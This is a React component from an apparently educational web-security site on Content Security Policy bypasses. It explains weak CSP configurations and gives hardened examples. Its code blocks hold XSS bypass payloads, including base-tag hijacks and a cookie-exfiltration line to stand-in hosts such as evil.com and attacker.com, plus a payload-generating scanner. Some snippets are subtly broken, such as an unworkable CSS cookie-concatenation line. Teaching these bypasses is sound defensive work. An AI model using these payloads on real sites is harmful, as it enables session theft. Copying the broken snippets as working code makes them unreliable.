
import React from 'react';
import { ShieldX } from 'lucide-react';
import CodeExample from '@/components/CodeExample';

const CSPBypass: React.FC = () => {
  return (
    <section id="csp" className="scroll-mt-20">
      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">Content Security Policy (CSP) Bypass</h3>
      
      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">What is CSP Bypass?</h4>
        <p className="mb-4">
          Content Security Policy (CSP) bypass attacks exploit weaknesses in CSP configurations to execute 
          malicious code despite the security policy being in place. CSP is designed to prevent cross-site 
          scripting (XSS) and code injection attacks, but misconfigurations or implementation flaws can 
          render it ineffective.
        </p>
        <p className="mb-4">
          These attacks are particularly dangerous because they can turn a protected application into a 
          vulnerable one, often giving attackers a false sense of security while the application remains 
          exploitable through sophisticated bypass techniques.
        </p>
      </div>

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Attacker Goals</h4>
        <ul className="list-disc pl-6 space-y-2">
          <li><strong>Execute Arbitrary JavaScript:</strong> Run malicious scripts despite CSP restrictions</li>
          <li><strong>Data Exfiltration:</strong> Steal sensitive information like cookies, tokens, or user data</li>
          <li><strong>DOM Manipulation:</strong> Modify page content to phish users or inject malicious forms</li>
          <li><strong>Redirect Attacks:</strong> Redirect users to malicious sites or phishing pages</li>
          <li><strong>Keylogging:</strong> Capture user keystrokes and form inputs</li>
          <li><strong>Session Hijacking:</strong> Steal session tokens or authentication credentials</li>
          <li><strong>Cryptocurrency Mining:</strong> Use victim's browser resources for mining operations</li>
          <li><strong>Botnet Recruitment:</strong> Turn user's browser into part of a botnet</li>
        </ul>
      </div>

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Vulnerable Components</h4>
        <ul className="list-disc pl-6 space-y-2">
          <li><strong>Weak CSP Directives:</strong> Policies using 'unsafe-inline', 'unsafe-eval', or overly permissive wildcards</li>
          <li><strong>Allowlisted Domains:</strong> Trusted domains that host JSONP endpoints or user-controlled content</li>
          <li><strong>CDN Services:</strong> Content delivery networks that allow arbitrary callback functions</li>
          <li><strong>Third-party Libraries:</strong> JavaScript libraries with known CSP bypass techniques</li>
          <li><strong>Angular Applications:</strong> AngularJS apps vulnerable to template injection bypasses</li>
          <li><strong>Legacy Browser Support:</strong> Older browsers with incomplete CSP implementations</li>
          <li><strong>Nonce/Hash Implementations:</strong> Improperly implemented nonce or hash-based CSP</li>
          <li><strong>Base-URI Misconfigurations:</strong> Missing or weak base-uri directive implementations</li>
        </ul>
      </div>

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Why CSP Bypasses Work</h4>
        <div className="bg-cybr-muted/30 p-6 rounded-lg mb-4">
          <h5 className="font-semibold mb-3">Common Weakness Patterns</h5>
          
          <div className="space-y-4">
            <div>
              <h6 className="font-semibold text-cybr-primary">1. Unsafe Directives</h6>
              <p className="text-sm">Using 'unsafe-inline' or 'unsafe-eval' negates most CSP protections</p>
            </div>
            
            <div>
              <h6 className="font-semibold text-cybr-primary">2. Wildcard Domains</h6>
              <p className="text-sm">Allowing entire domains (*.example.com) may include compromised subdomains</p>
            </div>
            
            <div>
              <h6 className="font-semibold text-cybr-primary">3. JSONP Endpoints</h6>
              <p className="text-sm">Trusted domains with JSONP endpoints allow arbitrary callback execution</p>
            </div>
            
            <div>
              <h6 className="font-semibold text-cybr-primary">4. Missing Directives</h6>
              <p className="text-sm">Omitting base-uri, object-src, or other directives leaves attack vectors open</p>
            </div>
          </div>
        </div>
      </div>

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Step-by-Step Exploitation Process</h4>
        <div className="space-y-4">
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold text-cybr-primary mb-2">Phase 1: CSP Analysis</h5>
            <ol className="list-decimal pl-6 space-y-1">
              <li>Extract CSP policy from HTTP headers or meta tags</li>
              <li>Identify dangerous directives (unsafe-inline, unsafe-eval)</li>
              <li>Enumerate allowlisted domains and their capabilities</li>
              <li>Check for missing critical directives</li>
            </ol>
          </div>
          
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold text-cybr-primary mb-2">Phase 2: Bypass Vector Discovery</h5>
            <ol className="list-decimal pl-6 space-y-1">
              <li>Test allowlisted domains for JSONP endpoints</li>
              <li>Search for AngularJS template injection opportunities</li>
              <li>Identify nonce/hash leakage or prediction possibilities</li>
              <li>Test for base-uri exploitation vectors</li>
            </ol>
          </div>
          
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold text-cybr-primary mb-2">Phase 3: Payload Crafting</h5>
            <ol className="list-decimal pl-6 space-y-1">
              <li>Develop bypass payload using discovered vectors</li>
              <li>Test payload execution in target environment</li>
              <li>Refine payload to avoid detection</li>
              <li>Implement payload delivery mechanism</li>
            </ol>
          </div>
        </div>
      </div>

      <CodeExample 
        language="javascript" 
        isVulnerable={true}
        title="Vulnerable CSP Configuration Examples" 
        code={`// 1. DANGEROUS: Using unsafe-inline
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' 'unsafe-inline' https://trusted-cdn.com;"
  );
  next();
});

// Allows inline scripts - CSP bypass:
// <script>alert(document.cookie)</script>

// 2. DANGEROUS: Wildcard allowlisting
res.setHeader(
  'Content-Security-Policy',
  "default-src 'self'; script-src 'self' https://*.googleapis.com;"
);

// Bypass using Google's JSONP endpoints:
// <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>

// 3. DANGEROUS: Missing base-uri directive
res.setHeader(
  'Content-Security-Policy',
  "default-src 'self'; script-src 'self'"
);

// Bypass by injecting base tag:
// <base href="https://evil.com/">
// <script src="app.js"></script> // Now loads from evil.com

// 4. DANGEROUS: Allowing data: URIs
res.setHeader(
  'Content-Security-Policy',
  "default-src 'self'; script-src 'self' data:;"
);

// Bypass using data URIs:
// <script src="data:text/javascript,alert(document.cookie)"></script>

// 5. DANGEROUS: Weak nonce implementation
const nonce = 'static-nonce-123'; // Predictable nonce
res.setHeader(
  'Content-Security-Policy',
  \`default-src 'self'; script-src 'self' 'nonce-\${nonce}';\`
);

// Bypass by predicting nonce:
// <script nonce="static-nonce-123">alert(1)</script>`} 
      />

      <CodeExample 
        language="html" 
        isVulnerable={true}
        title="Real-World CSP Bypass Examples" 
        code={`<!-- 1. JSONP Endpoint Bypass -->
<!-- CSP: script-src 'self' https://api.trusted-site.com -->
<script src="https://api.trusted-site.com/jsonp?callback=alert&data=document.cookie"></script>

<!-- 2. AngularJS Template Injection Bypass -->
<!-- CSP: script-src 'self' https://ajax.googleapis.com -->
<div ng-app ng-csp>
  <input ng-focus="$event.target.ownerDocument.defaultView.alert(document.cookie)" autofocus>
</div>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>

<!-- 3. Base-URI Exploitation -->
<!-- CSP: script-src 'self' (missing base-uri) -->
<base href="https://attacker.com/">
<script src="app.js"></script> <!-- Loads from attacker.com -->

<!-- 4. Object-src Bypass with Flash -->
<!-- CSP: script-src 'self' (missing object-src) -->
<object data="https://attacker.com/malicious.swf" type="application/x-shockwave-flash">
  <param name="allowScriptAccess" value="always">
  <param name="movie" value="https://attacker.com/malicious.swf">
</object>

<!-- 5. Style-src Bypass with CSS Injection -->
<!-- CSP: script-src 'self'; style-src 'unsafe-inline' -->
<style>
  body { 
    background: url('https://attacker.com/log.php?cookie=' + document.cookie); 
  }
</style>

<!-- 6. Meta Refresh Bypass -->
<!-- CSP: script-src 'self' (missing navigate-to) -->
<meta http-equiv="refresh" content="0;url=javascript:alert(document.cookie)">

<!-- 7. Form Action Bypass -->
<!-- CSP: script-src 'self' (missing form-action) -->
<form action="javascript:alert(document.cookie)">
  <input type="submit" value="Click me">
</form>`} 
      />

      <CodeExample 
        language="javascript" 
        isVulnerable={true}
        title="Advanced Bypass Techniques" 
        code={`// 1. Nonce Leakage Exploitation
// If nonce is leaked in DOM or predictable
function findNonce() {
  const scripts = document.querySelectorAll('script[nonce]');
  if (scripts.length > 0) {
    return scripts[0].getAttribute('nonce');
  }
  return null;
}

const leakedNonce = findNonce();
if (leakedNonce) {
  const script = document.createElement('script');
  script.setAttribute('nonce', leakedNonce);
  script.textContent = 'alert("CSP bypassed with leaked nonce!");';
  document.head.appendChild(script);
}

// 2. DOM-based CSP Bypass
// Exploiting innerHTML with CSP allowing certain domains
function bypassWithInnerHTML() {
  const div = document.createElement('div');
  // If CSP allows 'unsafe-inline' for style-src
  div.innerHTML = '<img src="x" onerror="alert(document.cookie)" style="display:none">';
  document.body.appendChild(div);
}

// 3. Service Worker Bypass
// If CSP doesn't restrict worker-src
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('data:application/javascript,self.addEventListener("fetch", e => { if(e.request.url.includes("bypass")) { e.respondWith(new Response("<script>alert(1)</script>", {headers: {"Content-Type": "text/html"}})); } });');
}

// 4. WebAssembly Bypass
// If CSP allows 'unsafe-eval' or doesn't restrict wasm-src
async function wasmBypass() {
  const wasmCode = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, // WASM header
    // ... WASM bytecode that calls JavaScript
  ]);
  
  const wasmModule = await WebAssembly.instantiate(wasmCode, {
    env: {
      alert: (msg) => alert(msg)
    }
  });
  
  wasmModule.instance.exports.exploit();
}

// 5. Trusted Types Bypass
// If Trusted Types policy is bypassable
if (window.trustedTypes) {
  const policy = trustedTypes.createPolicy('bypass', {
    createHTML: (input) => input,
    createScript: (input) => input
  });
  
  document.body.innerHTML = policy.createHTML('<script>alert("Trusted Types bypassed")</script>');
}

// 6. Import Maps Bypass (Modern browsers)
// If CSP doesn't restrict import maps
const importMap = {
  "imports": {
    "safe-module": "data:text/javascript,alert('Import map bypass')"
  }
};

const script = document.createElement('script');
script.type = 'importmap';
script.textContent = JSON.stringify(importMap);
document.head.appendChild(script);

// Then import the malicious module
import('safe-module');`} 
      />

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Detection and Testing Methods</h4>
        
        <div className="space-y-6">
          <div>
            <h5 className="font-semibold mb-3">Manual Testing Methodology</h5>
            <ol className="list-decimal pl-6 space-y-2">
              <li>
                <strong>CSP Policy Extraction:</strong>
                <ul className="list-disc pl-6 mt-1">
                  <li>Check Content-Security-Policy header in HTTP responses</li>
                  <li>Look for CSP meta tags in HTML head section</li>
                  <li>Identify Report-Only policies that don't enforce restrictions</li>
                </ul>
              </li>
              <li>
                <strong>Dangerous Directive Analysis:</strong>
                <ul className="list-disc pl-6 mt-1">
                  <li>Search for 'unsafe-inline', 'unsafe-eval', 'unsafe-hashes'</li>
                  <li>Check for wildcard domains (*.example.com)</li>
                  <li>Identify data: and blob: URI allowances</li>
                </ul>
              </li>
              <li>
                <strong>Allowlisted Domain Testing:</strong>
                <ul className="list-disc pl-6 mt-1">
                  <li>Test each allowlisted domain for JSONP endpoints</li>
                  <li>Search for user-controlled content on trusted domains</li>
                  <li>Check for subdomain takeover possibilities</li>
                </ul>
              </li>
              <li>
                <strong>Missing Directive Detection:</strong>
                <ul className="list-disc pl-6 mt-1">
                  <li>Check for missing base-uri, object-src, frame-ancestors</li>
                  <li>Test form-action and navigate-to restrictions</li>
                  <li>Verify worker-src and manifest-src policies</li>
                </ul>
              </li>
            </ol>
          </div>
          
          <div>
            <h5 className="font-semibold mb-3">Automated Testing Tools</h5>
            <ul className="list-disc pl-6 space-y-2">
              <li><strong>CSP Evaluator:</strong> Google's online tool for CSP policy analysis</li>
              <li><strong>CSP Auditor:</strong> Burp Suite extension for CSP testing</li>
              <li><strong>CSP Scanner:</strong> OWASP ZAP plugin for CSP vulnerability detection</li>
              <li><strong>Laboratory (Burp Extension):</strong> Comprehensive CSP bypass testing</li>
              <li><strong>Custom Scripts:</strong> Python/JavaScript tools for automated bypass testing</li>
            </ul>
          </div>
        </div>
      </div>

      <CodeExample 
        language="python" 
        isVulnerable={false}
        title="CSP Bypass Detection Script" 
        code={`#!/usr/bin/env python3
import requests
import re
from urllib.parse import urljoin, urlparse

class CSPBypassTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.dangerous_patterns = [
            r"'unsafe-inline'",
            r"'unsafe-eval'",
            r"'unsafe-hashes'",
            r"\*\..*\.com",  # Wildcard domains
            r"data:",
            r"blob:",
            r"'self'\s+\*"
        ]
        
    def extract_csp_policy(self):
        """Extract CSP policy from target"""
        try:
            response = self.session.get(self.target_url)
            
            # Check HTTP header
            csp_header = response.headers.get('Content-Security-Policy', '')
            
            # Check meta tag
            meta_match = re.search(
                r'<meta[^>]+http-equiv=["\']?Content-Security-Policy["\']?[^>]+content=["\']([^"\']+)["\']',
                response.text,
                re.IGNORECASE
            )
            csp_meta = meta_match.group(1) if meta_match else ''
            
            return csp_header or csp_meta
            
        except Exception as e:
            print(f"Error extracting CSP: {e}")
            return None
    
    def analyze_dangerous_directives(self, csp_policy):
        """Analyze CSP for dangerous directives"""
        if not csp_policy:
            return []
        
        vulnerabilities = []
        
        for pattern in self.dangerous_patterns:
            if re.search(pattern, csp_policy, re.IGNORECASE):
                vulnerabilities.append({
                    'type': 'dangerous_directive',
                    'pattern': pattern,
                    'description': f'Found dangerous pattern: {pattern}'
                })
        
        return vulnerabilities
    
    def find_missing_directives(self, csp_policy):
        """Find missing critical directives"""
        if not csp_policy:
            return []
        
        critical_directives = [
            'base-uri',
            'object-src',
            'frame-ancestors',
            'form-action',
            'navigate-to'
        ]
        
        missing = []
        for directive in critical_directives:
            if directive not in csp_policy.lower():
                missing.append({
                    'type': 'missing_directive',
                    'directive': directive,
                    'description': f'Missing {directive} directive'
                })
        
        return missing
    
    def test_jsonp_endpoints(self, csp_policy):
        """Test allowlisted domains for JSONP endpoints"""
        if not csp_policy:
            return []
        
        # Extract domains from script-src
        script_src_match = re.search(r'script-src[^;]*', csp_policy)
        if not script_src_match:
            return []
        
        script_src = script_src_match.group(0)
        domains = re.findall(r'https?://([^\\s;]+)', script_src)
        
        jsonp_vulns = []
        
        for domain in domains:
            # Test common JSONP endpoints
            jsonp_endpoints = [
                f'https://{domain}/jsonp?callback=alert',
                f'https://{domain}/api/jsonp?callback=alert',
                f'https://{domain}/search?callback=alert'
            ]
            
            for endpoint in jsonp_endpoints:
                try:
                    response = self.session.get(endpoint, timeout=5)
                    if 'alert(' in response.text:
                        jsonp_vulns.append({
                            'type': 'jsonp_endpoint',
                            'url': endpoint,
                            'description': f'JSONP endpoint found: {endpoint}'
                        })
                except:
                    continue
        
        return jsonp_vulns
    
    def generate_bypass_payloads(self, vulnerabilities):
        """Generate potential bypass payloads"""
        payloads = []
        
        for vuln in vulnerabilities:
            if vuln['type'] == 'dangerous_directive':
                if "'unsafe-inline'" in vuln['pattern']:
                    payloads.append('<script>alert("CSP bypass via unsafe-inline")</script>')
                elif "data:" in vuln['pattern']:
                    payloads.append('<script src="data:text/javascript,alert(1)"></script>')
                    
            elif vuln['type'] == 'missing_directive':
                if vuln['directive'] == 'base-uri':
                    payloads.append('<base href="https://evil.com/"><script src="app.js"></script>')
                elif vuln['directive'] == 'object-src':
                    payloads.append('<object data="https://evil.com/bypass.swf"></object>')
                    
            elif vuln['type'] == 'jsonp_endpoint':
                payloads.append(f'<script src="{vuln["url"]}"></script>')
        
        return payloads
    
    def run_comprehensive_test(self):
        """Run complete CSP bypass test"""
        print("=== CSP Bypass Security Assessment ===")
        print(f"Testing: {self.target_url}")
        
        # Extract CSP policy
        csp_policy = self.extract_csp_policy()
        if not csp_policy:
            print("[!] No CSP policy found - Application is vulnerable to XSS")
            return
        
        print(f"[+] CSP Policy found: {csp_policy[:100]}...")
        
        # Analyze vulnerabilities
        all_vulns = []
        all_vulns.extend(self.analyze_dangerous_directives(csp_policy))
        all_vulns.extend(self.find_missing_directives(csp_policy))
        all_vulns.extend(self.test_jsonp_endpoints(csp_policy))
        
        if all_vulns:
            print(f"[!] Found {len(all_vulns)} potential CSP bypass vulnerabilities:")
            for vuln in all_vulns:
                print(f"    - {vuln['description']}")
            
            # Generate payloads
            payloads = self.generate_bypass_payloads(all_vulns)
            if payloads:
                print(f"[!] Generated {len(payloads)} potential bypass payloads:")
                for payload in payloads[:5]:  # Show first 5
                    print(f"    - {payload}")
        else:
            print("[+] No obvious CSP bypass vulnerabilities found")
            print("[+] CSP policy appears to be properly configured")

# Usage
if __name__ == "__main__":
    tester = CSPBypassTester("https://example.com")
    tester.run_comprehensive_test()`} 
      />

      <CodeExample 
        language="javascript" 
        isVulnerable={false}
        title="Secure CSP Implementation" 
        code={`const express = require('express');
const crypto = require('crypto');
const app = express();

// 1. Generate cryptographically strong nonces
function generateNonce() {
  return crypto.randomBytes(16).toString('base64');
}

// 2. Strict CSP implementation
app.use((req, res, next) => {
  const nonce = generateNonce();
  res.locals.nonce = nonce;
  
  // Comprehensive CSP policy
  const cspPolicy = [
    "default-src 'none'",
    \`script-src 'self' 'nonce-\${nonce}' https://specific-trusted-cdn.com\`,
    "style-src 'self' https://specific-trusted-cdn.com",
    "img-src 'self' data: https://trusted-images.com",
    "font-src 'self' https://trusted-fonts.com",
    "connect-src 'self' https://api.trusted-domain.com",
    "frame-src 'none'",
    "object-src 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    "frame-ancestors 'none'",
    "navigate-to 'self' https://trusted-external.com",
    "worker-src 'self'",
    "manifest-src 'self'",
    "media-src 'self'",
    "prefetch-src 'self'",
    "child-src 'none'",
    "sandbox allow-same-origin allow-scripts allow-forms",
    "upgrade-insecure-requests",
    "block-all-mixed-content",
    "require-trusted-types-for 'script'",
    "trusted-types angular default"
  ].join('; ');
  
  res.setHeader('Content-Security-Policy', cspPolicy);
  
  // Also set report-only for monitoring
  res.setHeader('Content-Security-Policy-Report-Only', 
    cspPolicy + '; report-uri /csp-report'
  );
  
  next();
});

// 3. CSP violation reporting endpoint
app.post('/csp-report', express.json(), (req, res) => {
  const report = req.body;
  
  // Log CSP violations for analysis
  console.log('CSP Violation:', JSON.stringify(report, null, 2));
  
  // Alert security team for suspicious violations
  if (report['csp-report']) {
    const violation = report['csp-report'];
    if (violation['blocked-uri'] && violation['blocked-uri'].includes('evil.com')) {
      // Potential attack detected
      alertSecurityTeam(violation);
    }
  }
  
  res.status(204).send();
});

// 4. Secure template rendering with nonce
app.get('/secure-page', (req, res) => {
  const html = \`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Secure Page</title>
      <meta charset="utf-8">
    </head>
    <body>
      <h1>Secure Content</h1>
      <script nonce="\${res.locals.nonce}">
        // Safe inline script with nonce
        console.log('This script is allowed by CSP');
      </script>
      
      <!-- External scripts must be from allowlisted domains -->
      <script src="https://specific-trusted-cdn.com/library.js"></script>
    </body>
    </html>
  \`;
  
  res.send(html);
});

// 5. Additional security headers
app.use((req, res, next) => {
  // Complement CSP with other security headers
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '0'); // Disable as CSP provides better protection
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
  
  next();
});

// 6. Trusted Types implementation for modern browsers
app.get('/trusted-types-example', (req, res) => {
  const html = \`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Trusted Types Example</title>
    </head>
    <body>
      <div id="content"></div>
      
      <script nonce="\${res.locals.nonce}">
        // Create trusted types policy
        const policy = trustedTypes.createPolicy('myPolicy', {
          createHTML: (input) => {
            // Sanitize input before creating trusted HTML
            return input.replace(/<script[^>]*>.*?<\\/script>/gi, '');
          },
          createScript: (input) => {
            // Only allow specific safe scripts
            const allowedScripts = ['console.log', 'document.getElementById'];
            if (allowedScripts.some(allowed => input.includes(allowed))) {
              return input;
            }
            return '';
          }
        });
        
        // Use trusted types for DOM manipulation
        const content = document.getElementById('content');
        content.innerHTML = policy.createHTML('<p>Safe content</p>');
      </script>
    </body>
    </html>
  \`;
  
  res.send(html);
});

// 7. CSP policy testing and validation
function validateCSPPolicy(policy) {
  const warnings = [];
  
  // Check for dangerous directives
  if (policy.includes("'unsafe-inline'")) {
    warnings.push("Contains 'unsafe-inline' directive");
  }
  
  if (policy.includes("'unsafe-eval'")) {
    warnings.push("Contains 'unsafe-eval' directive");
  }
  
  // Check for wildcard domains
  if (policy.match(/https?:\\/\\/\\*\\./)) {
    warnings.push("Contains wildcard domain allowlist");
  }
  
  // Check for missing critical directives
  const requiredDirectives = ['base-uri', 'object-src', 'frame-ancestors'];
  requiredDirectives.forEach(directive => {
    if (!policy.includes(directive)) {
      warnings.push(\`Missing \${directive} directive\`);
    }
  });
  
  return warnings;
}

// 8. Environment-specific CSP configuration
const environment = process.env.NODE_ENV || 'development';

if (environment === 'development') {
  // More permissive CSP for development
  app.use('/dev', (req, res, next) => {
    res.setHeader('Content-Security-Policy', 
      "default-src 'self' 'unsafe-inline' 'unsafe-eval'; " +
      "connect-src 'self' ws: wss:; " +
      "report-uri /csp-report"
    );
    next();
  });
} else {
  // Strict CSP for production
  console.log('Production CSP enforced');
}

function alertSecurityTeam(violation) {
  // Implementation for security team alerting
  console.log('SECURITY ALERT: Potential CSP bypass attempt detected');
  console.log('Violation details:', violation);
}

module.exports = app;`} 
      />

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Environment-Specific Considerations</h4>
        
        <div className="space-y-6">
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold text-cybr-primary mb-2">Single Page Applications (SPAs)</h5>
            <ul className="list-disc pl-6 space-y-1">
              <li><strong>React:</strong> Use nonce-based CSP with strict-dynamic for component scripts</li>
              <li><strong>Angular:</strong> Configure CSP to work with Angular's template compilation</li>
              <li><strong>Vue.js:</strong> Handle inline styles and templates with proper CSP directives</li>
              <li><strong>Dynamic Content:</strong> Implement trusted types for runtime content generation</li>
            </ul>
          </div>
          
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold text-cybr-primary mb-2">Content Management Systems</h5>
            <ul className="list-disc pl-6 space-y-1">
              <li><strong>WordPress:</strong> Plugin compatibility with CSP restrictions</li>
              <li><strong>Drupal:</strong> Module script loading and CSP configuration</li>
              <li><strong>Joomla:</strong> Template and extension CSP compatibility</li>
              <li><strong>Custom CMS:</strong> Editor-generated content CSP compliance</li>
            </ul>
          </div>
          
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold text-cybr-primary mb-2">E-commerce Platforms</h5>
            <ul className="list-disc pl-6 space-y-1">
              <li><strong>Payment Processors:</strong> CSP configuration for payment widget integration</li>
              <li><strong>Analytics:</strong> Allowlisting for Google Analytics, Facebook Pixel, etc.</li>
              <li><strong>Chat Widgets:</strong> Third-party chat service CSP requirements</li>
              <li><strong>A/B Testing:</strong> Dynamic content testing tool compatibility</li>
            </ul>
          </div>
          
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold text-cybr-primary mb-2">Mobile Applications</h5>
            <ul className="list-disc pl-6 space-y-1">
              <li><strong>Hybrid Apps:</strong> Cordova/PhoneGap CSP configuration</li>
              <li><strong>WebView:</strong> Native app embedded web content CSP</li>
              <li><strong>Progressive Web Apps:</strong> Service worker and manifest CSP</li>
              <li><strong>Mobile-Specific APIs:</strong> Geolocation, camera access CSP</li>
            </ul>
          </div>
        </div>
      </div>

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Special Bypass Scenarios</h4>
        
        <div className="space-y-4">
          <div className="bg-red-900/20 p-4 rounded-lg border border-red-400">
            <h5 className="font-semibold text-red-400 mb-2">Browser-Specific Bypasses</h5>
            <p className="text-sm mb-2">
              Different browsers implement CSP differently, creating opportunities for browser-specific bypasses.
            </p>
            <ul className="text-sm list-disc pl-4">
              <li>Internet Explorer: Limited CSP support allows many bypasses</li>
              <li>Safari: Webkit-specific CSP implementation quirks</li>
              <li>Chrome: V8 engine specific bypass techniques</li>
              <li>Firefox: Gecko engine CSP behavior differences</li>
            </ul>
          </div>
          
          <div className="bg-yellow-900/20 p-4 rounded-lg border border-yellow-400">
            <h5 className="font-semibold text-yellow-400 mb-2">Legacy Application Integration</h5>
            <p className="text-sm mb-2">
              Older applications may require CSP relaxation, creating bypass opportunities.
            </p>
            <ul className="text-sm list-disc pl-4">
              <li>Legacy jQuery plugins requiring eval()</li>
              <li>Old analytics code using document.write()</li>
              <li>Legacy Flash/Silverlight content</li>
              <li>Inline event handlers in legacy code</li>
            </ul>
          </div>
          
          <div className="bg-blue-900/20 p-4 rounded-lg border border-blue-400">
            <h5 className="font-semibold text-blue-400 mb-2">Third-Party Service Integration</h5>
            <p className="text-sm mb-2">
              Third-party services often require CSP modifications that can introduce vulnerabilities.
            </p>
            <ul className="text-sm list-disc pl-4">
              <li>Social media widgets with relaxed CSP</li>
              <li>Advertising networks requiring unsafe-inline</li>
              <li>Customer support chat widgets</li>
              <li>Marketing automation tools</li>
            </ul>
          </div>
        </div>
      </div>

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Advanced Prevention Strategies</h4>
        <ul className="list-disc pl-6 space-y-2">
          <li><strong>Implement Strict CSP:</strong> Use 'strict-dynamic' with nonces for modern browsers</li>
          <li><strong>Deploy Trusted Types:</strong> Implement trusted types for DOM manipulation security</li>
          <li><strong>Use Report-Only Mode:</strong> Test CSP policies with report-only before enforcement</li>
          <li><strong>Regular Policy Audits:</strong> Continuously review and update CSP policies</li>
          <li><strong>Automate CSP Testing:</strong> Integrate CSP bypass testing into CI/CD pipelines</li>
          <li><strong>Monitor CSP Violations:</strong> Set up alerting for suspicious CSP violation reports</li>
          <li><strong>Implement CSP Nonce Rotation:</strong> Use cryptographically strong, rotating nonces</li>
          <li><strong>Layer Security Controls:</strong> Combine CSP with input validation and output encoding</li>
          <li><strong>Browser Compatibility Testing:</strong> Test CSP across all supported browsers</li>
          <li><strong>Third-Party Service Vetting:</strong> Evaluate security implications of allowlisted domains</li>
        </ul>
      </div>
    </section>
  );
};

export default CSPBypass;
